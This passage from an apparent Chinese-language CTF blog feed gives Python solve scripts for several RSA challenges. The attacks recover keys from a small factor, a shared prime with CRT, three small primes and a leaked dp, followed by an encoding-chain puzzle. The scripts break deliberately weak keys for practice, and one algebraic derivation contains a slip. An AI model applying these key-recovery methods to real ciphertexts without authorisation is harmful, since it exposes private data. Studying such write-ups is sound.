class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> long</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">public = RSA.importKey(<span class="built_in">open</span>(<span class="string">&#x27;easyrsa8\public.key&#x27;</span>).read())</span><br><span class="line">n = long(public.n)</span><br><span class="line">e = long(public.e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">p = <span class="number">97</span></span><br><span class="line">q = <span class="number">106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609</span></span><br><span class="line">d = <span class="number">4520639064487098151327174667961365516283539231992543792882057746866179464294032313887767783621724945557985447874376379715922452725597335427159165685648572663979688014560576024497341124412004366514253110547369977143739781801290219136578513871764574450392367530817034216313429071683911546803031169524669257788417</span></span><br><span class="line">rsakey = RSA.importKey(<span class="built_in">open</span>(<span class="string">r&#x27;easyrsa8\public.key&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">privatekey = RSA.construct((n,e,d,p,q))</span><br><span class="line">rsa = PKCS1_OAEP.new(privatekey)</span><br><span class="line">m = rsa.decrypt(<span class="built_in">open</span>(<span class="string">r&#x27;easyrsa8\flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="funnyrsa1"><a href="#funnyrsa1" class="headerlink" title="funnyrsa1"></a>funnyrsa1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">14606334023791426</span></span><br><span class="line">p1 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q1 = <span class="number">130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span></span><br><span class="line">c1 = <span class="number">11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span></span><br><span class="line">n1 = p1 * q1</span><br><span class="line"> </span><br><span class="line">e2 = <span class="number">13813369129257838</span></span><br><span class="line">p2 = <span class="number">121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span></span><br><span class="line">q2 = <span class="number">94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span></span><br><span class="line">c2 = <span class="number">7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span></span><br><span class="line">n2 = p2 * q2</span><br><span class="line"> </span><br><span class="line">p = p1</span><br><span class="line">phi1 = (p - <span class="number">1</span>) * (q1 - <span class="number">1</span>)</span><br><span class="line">phi2 = (p - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">b = gmpy2.gcd(e1, phi1)</span><br><span class="line">a1 = e1 // b</span><br><span class="line">a2 = e2 // b</span><br><span class="line">bd1 = gmpy2.invert(a1, phi1)</span><br><span class="line">bd2 = gmpy2.invert(a2, phi2)</span><br><span class="line"> </span><br><span class="line">mb1 = <span class="built_in">pow</span>(c1, bd1, n1)</span><br><span class="line">mb2 = <span class="built_in">pow</span>(c2, bd2, n2)</span><br><span class="line">c3 = mb1 * mb2 % p</span><br><span class="line">c2 = mb2 % q2</span><br><span class="line">c1 = mb1 % q1</span><br><span class="line"> </span><br><span class="line">res = solve_crt([c1, c2, c3], [q1, q2, p])   <span class="comment">#crt中国同余定理,求出特解作为</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"> </span><br><span class="line">n = q1 * q2</span><br><span class="line">f = (q1 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">m = res % n</span><br><span class="line">d2 = gmpy2.invert(<span class="number">7</span>, f)</span><br><span class="line">m = <span class="built_in">pow</span>(m, d2, n)</span><br><span class="line">msg = gmpy2.iroot(m, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(msg))</span><br><span class="line"><span class="built_in">str</span> = long_to_bytes(msg)</span><br><span class="line"><span class="comment"># 转为utf-8 类型的bytes 字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解码结果：&quot;</span>+<span class="built_in">str</span>.decode())</span><br></pre></td></tr></table></figure><h3 id="funnyrsa2"><a href="#funnyrsa2" class="headerlink" title="funnyrsa2"></a>funnyrsa2</h3><p><img src="https://s1.vika.cn/space/2023/02/22/1245e56d060d42c5b5a9d993c3738821" alt="image-20221110101200070"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">876391552113414716726089</span></span><br><span class="line">q = <span class="number">932470255754103340237147</span></span><br><span class="line">r = <span class="number">1098382268985762240184333</span></span><br><span class="line"><span class="comment"># n分解出三个数</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">876391552113414716726089</span></span><br><span class="line">q = <span class="number">932470255754103340237147</span></span><br><span class="line">r = <span class="number">1098382268985762240184333</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">897607935780955837078784515115186203180822213482989041398073067996023639</span></span><br><span class="line">c = <span class="number">490571531583321382715358426750276448536961994273309958885670149895389968</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="funnyrsa3"><a href="#funnyrsa3" class="headerlink" title="funnyrsa3"></a>funnyrsa3</h3><p>已知公钥n,e以及dp</p><p>其中,dp &#x3D; d mod (p-1) </p><p>已知：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = m^e mod n</span><br><span class="line">m = c^d mod n</span><br><span class="line">ϕ(n)=(p−1)*(q−1)</span><br><span class="line">d∗e ≡ 1 mod ϕ(n)</span><br><span class="line">dp = d mod (p−1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由上式可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp*e≡d*e mod (p−1)</span><br></pre></td></tr></table></figure><p>因此可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">式1：d∗e=k∗(p−1)+dp∗e</span><br><span class="line">式2：d∗e≡1 mod ϕ(n)</span><br></pre></td></tr></table></figure><p>式1带入式2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">=&gt; k∗(p−<span class="number">1</span>)+dp∗e ≡<span class="number">1</span> mod ϕ(n)</span><br><span class="line"></span><br><span class="line">=&gt; k∗(p−<span class="number">1</span>)+dp∗e ≡<span class="number">1</span> mod (p−<span class="number">1</span>)∗(q−<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">=&gt; k1∗(p−<span class="number">1</span>)+dp∗e = k2*(p−<span class="number">1</span>)∗(q−<span class="number">1</span>)+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">=&gt; dp*e =  k2*(p−<span class="number">1</span>)∗(q−<span class="number">1</span>)+<span class="number">1</span>-k1∗(p−<span class="number">1</span>)+dp∗e</span><br><span class="line"></span><br><span class="line">=&gt; dp*e = (p-<span class="number">1</span>)*[k2*(p-<span class="number">1</span>)-k1]+<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因dp&lt;p−1（dp是d&#x2F;&#x2F;（p-1）的余数，dp&lt;p−1）</p><p>所以e &gt; k2∗(q−1)−k1</p><p>假设 x&#x3D;k2∗(q−1)−k1</p><p>x的范围为 (0,e)</p><p>x∗(p−1)+1&#x3D;dp∗e （dp*e&#x3D;1 mod (p-1)）</p><p>求出p-1方法，遍历(0,e)的范围，其中肯定有一个p可以被n整除，那么求出p和q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">13851998696110232034312408768370264747862778787235362033287301947690834384177869107768578977872169953363148442670412868565346964490724532894099772144625540138618913694240688555684873934424471837897053658485573395777349902581306875149677867098014969597240339327588421766510008083189109825385296069501377605893298996953970043168244444585264894721914216744153344106498382558756181912535774309211692338879110643793628550244212618635476290699881188640645260075209594318725693972840846967120418641315829098807385382509029722923894508557890331485536938749583463709142484622852210528766911899504093351926912519458381934550361</span></span><br><span class="line">dp = <span class="number">100611735902103791101540576986246738909129436434351921338402204616138072968334504710528544150282236463859239501881283845616704984276951309172293190252510177093383836388627040387414351112878231476909883325883401542820439430154583554163420769232994455628864269732485342860663552714235811175102557578574454173473</span></span><br><span class="line">c = <span class="number">6181444980714386809771037400474840421684417066099228619603249443862056564342775884427843519992558503521271217237572084931179577274213056759651748072521423406391343404390036640425926587772914253834826777952428924120724879097154106281898045222573790203042535146780386650453819006195025203611969467741808115336980555931965932953399428393416196507391201647015490298928857521725626891994892890499900822051002774649242597456942480104711177604984775375394980504583557491508969320498603227402590571065045541654263605281038512927133012338467311855856106905424708532806690350246294477230699496179884682385040569548652234893413</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">    p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = libnum.n2s(<span class="built_in">int</span>(m)).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="萌新赛-抱抱我"><a href="#萌新赛-抱抱我" class="headerlink" title="萌新赛-抱抱我"></a>萌新赛-抱抱我</h3><p>又是经典加密题</p><p><img src="https://s1.vika.cn/space/2023/02/22/acae2d84950745aaba368108b82f2cbe" alt="image-20221110223517278"></p><p>第一行代码就是混稀字符</p><p>可以分析得出flag就是字符的 [i+1:i+10]，并且看起来有重复的</p><p>于是按题目的意思可以统计一下</p><p>解码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstring = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span></span><br><span class="line">length = <span class="number">300</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#125;f3gg&#125;lffgsag&#125;l3l6d3apd3gd3fd&#125;&#125;aga3ga&#125;a3&#123;6f1f3df&#123;&#123;d&#125;&#125;av3laf&#125;6adf3_d&#123;afa6f&#125;adt&#123;faf&#123;d33aaol3&#125;&#123;l&#125;ld&#125;3yl3a6a&#123;fa6&#125;_d33gf3fll&#125;of&#123;6lad&#125;&#125;fdx&#125;6d&#123;f&#125;ll63ugag66d&#123;6f3&#125;33&#125;al6l&#123;ffwf&#123;&#125;&#123;fl3a36ogg3&#123;&#125;&#125;g6&#125;3hl&#125;6dg6ld&#123;digaa&#125;g&#125;&#123;&#123;l&#125;da&#123;ddg3&#123;&#123;d&#125;w3&#125;ld&#125;adgg3m&#123;lad&#123;gd&#123;a&#123;7afff&#125;&#123;d6&#125;fsf3&#123;f&#125;gflgavfldg6a6&#123;ldqf&#125;fd&#123;f3f3&#125;73ddad&#123;666fz6&#125;d&#123;3&#123;l36a1d6fal3fl6lrl&#123;&#125;aga&#123;fdlsa&#125;&#123;6l6ag3gtgdg&#123;6lgf3f&#x27;</span></span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">11</span>):</span><br><span class="line">    f = c[i+<span class="number">1</span>:i+<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> a <span class="keyword">in</span> d:</span><br><span class="line">            d[a] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d1 = &#123;a:<span class="number">1</span>&#125;</span><br><span class="line">            d.update(d1)</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内部赛-签到题"><a href="#内部赛-签到题" class="headerlink" title="内部赛-签到题"></a>内部赛-签到题</h3><p>escape的加密解密<br>在很多脚本语言的应用当中,escape函数是一个<strong>可转换编码的函数,<strong>比如javascript 的 ajax 中,向a.php传递参数?city&#x3D;北京,可<em>先将”北京”用escape重新编码,再进行传递,在服务器端接收后再解码才不会出现乱码</em>。escape一般</strong>用于传递URL参数</strong>和类似urlencode base64_encode函数是类似的。如上?city&#x3D;北京</p><p>escape采用ISO Latin字符集对指定的字符串进行编码。所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成**%xx格式**的字符编码(xx等于该字符在字符集表里面的编码的16进制数字)</p><p>escape() 函数可对字符串进行编码，该方法不会对 ASCII 字母和数字进行编码，也不会 <strong>： * @ - _ + . &#x2F;</strong> 进行编码 。其他所有的字符都用 %xx 编码代替，其中 xx 等于表示该字符的十六进制数.字符值大于 255 的以 %uxxxx 格式存储。</p><p><a href="https://tool.chinaz.com/Tools/escape.aspx">https://tool.chinaz.com/Tools/escape.aspx</a></p><p>思路：</p><ol><li><p>base64编码</p></li><li><p>Escape加密&#x2F;UnEscape解密</p></li><li><p>base92加密&#x2F;解密</p></li><li><p>十进制 转换为16进制</p></li><li><p>url 解码。&#x3D;&#x3D;》十二星座编码 &#x3D;&#x3D;&gt; 十二进制</p></li><li><p>十二进制转16进制  &#x3D;&#x3D;&gt; 16进制转字符也可直接出flag</p></li><li><p>转ASCII</p></li><li><p>base 16 解密</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题-PHP特性</title>
      <link href="/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/"/>
      <url>/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/</url>
      
